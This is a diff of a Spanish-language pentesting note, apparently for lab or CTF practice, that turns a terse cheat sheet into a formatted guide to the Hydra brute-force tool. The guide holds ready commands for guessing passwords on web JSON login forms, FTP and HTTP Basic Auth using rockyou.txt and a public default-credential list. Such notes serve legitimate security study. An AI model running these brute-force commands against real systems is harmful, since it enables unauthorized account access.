@@ -1,34 +1,49 @@
-Herramienta para realizar fuerza bruta
+## Hydra
 
-| Parametro | Funcion                    |
-| --------- | -------------------------- |
-| -l        | Usuario especifico         |
-| -L        | Lista de usuarios          |
-| -p        | unica password             |
-| -P        | Listado de password        |
-| -s        | Para seleccionar el puerto |
+Herramienta para realizar **fuerza bruta** contra servicios de autenticación (web, FTP, SSH, básica...).
 
+### Parámetros principales
 
-##### Web
-hydra -l admin -P /usr/share/wordlists/rockyou.txt 172.17.0.2 -s "puerto" http-post-form "/login:{\"user\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:H=Content-Type\: application/json:F=Incorrect"
+| Parámetro | Función                |
+| --------- | ---------------------- |
+| `-l`      | Un usuario específico  |
+| `-L`      | Lista de usuarios      |
+| `-p`      | Una única contraseña   |
+| `-P`      | Listado de contraseñas |
+| `-s`      | Seleccionar el puerto  |
+| `-f`      | Parar al primer usuario/válido encontrado |
 
-- Para sacar el http-post-form nos iremos a la web en el login escribiremos lo que sea y le daremos enter -- dev-tools -- Network -- Peticion post -- request y lo veremos
-	![[Pasted image 20260515001459.png]]
+### Web (formulario POST con JSON)
 
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 172.17.0.2 -s <PUERTO> http-post-form \
+  "/login:{\"user\":\"^USER^\",\"password\":\"^PASS^\"}:H=Content-Type\: application/json:F=Incorrect"
+```
 
-##### FTP
+- `"^USER^"` y `"^PASS^"` son los marcadores donde Hydra inyecta cada usuario/password.
+- `F=Incorrect` es la cadena que aparece en la respuesta cuando el login falla.
+- **Cómo obtener el `http-post-form`:** en la web, en el login, escribe cualquier cosa y pulsa Enter → `DevTools → Network → petición POST → Request`. Ahí copias la URL, el cuerpo del POST y el campo de fallo.
+
+![[Pasted image 20260515001459.png]]
+
+### FTP
+
+```bash
+hydra -L usuarios.txt -P pass.txt ftp://172.17.0.2 -s <PUERTO>
+```
+
 ![[Pasted image 20260705143047.png]]
 
+### HTTP Basic Auth
 
-##### Basic Auth
-![[Pasted image 20260705161908.png]]
--C --> wordlist de posibles password pero con la siguiente estructura
-	![[Pasted image 20260705161644.png]]
-	"usuario":"password"
+```bash
+hydra -C /ruta/wordlist http-get://172.17.0.2 -s <PUERTO>
+```
 
-podemos acudir a wordlist de github 
-https://github.com/rix4uni/WordList/blob/main/default-username-password.txt
+- `-C` → wordlist de posibles **usuario:password** con formato `"usuario":"password"`.
+  ![[Pasted image 20260705161644.png]]
+- `-f` → detener al encontrar credenciales válidas.
+- `-s` → puerto.
+- `http-get` → porque la autenticación ocurre en el index; si no, indica la ruta (`/"donde corra el login"`).
 
--s --> Puerto
--f --> Ip de la maquina victima
--http-get --> porque se acontece en el index si no (/"donde corra el login")
+> Wordlist útil de credenciales por defecto: https://github.com/rix4uni/WordList/blob/main/default-username-password.txt
